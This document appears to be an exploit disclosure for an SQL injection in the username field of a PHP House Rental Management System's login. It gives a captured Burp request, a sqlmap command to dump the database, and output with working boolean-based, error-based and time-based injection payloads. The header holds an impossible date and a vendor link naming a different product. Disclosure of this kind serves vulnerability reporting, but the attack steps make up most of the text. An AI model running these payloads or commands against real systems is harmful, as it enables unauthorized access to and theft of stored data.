# House Rental Management System - SQL Injection - 1
+ **Exploit Title:** House Rental Management System - SQL Injection - 1
+ **Date:** 2024-15-05
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html
+ **Software Link:** https://download.code-projects.org/details/74c24d93-431e-4e31-acc1-802f14caef5c
+ **Version:** Latest
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
House Rental Management System allows SQL Injection via the 'username' parameter at "http://localhost/rental/login.php". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/rental/login.php"
+ Try logging in by typing random things
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
POST /rental/ajax.php?action=login HTTP/1.1
Host: localhost
Content-Length: 27
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/rental/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=1uglgqsdr43o5j4805l7v9kg7d
Connection: close

username=test&password=test

```

+ Use sqlmap to exploit. In sqlmap, use 'username' parameter to dump the database.
```
sqlmap -r r.txt -p username --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=test' OR NOT 6595=6595-- Zxii&password=test

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=test' AND (SELECT 7493 FROM(SELECT COUNT(*),CONCAT(0x7170717a71,(SELECT (ELT(7493=7493,1))),0x7170716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Pmrg&password=test

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 6993 FROM (SELECT(SLEEP(5)))lxxU)-- OQDx&password=test
---
[16:47:40] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:47:40] [INFO] fetching current database
[16:47:40] [INFO] retrieved: 'house_rental_latest'
current database: 'house_rental_latest'

```
+ current database: `house_rental_latest`

![Ekran görüntüsü 2024-05-16 000355](https://github.com/BurakSevben/CVEs/assets/117217689/27b7108b-470f-4a21-9429-f6b3a135aa90)

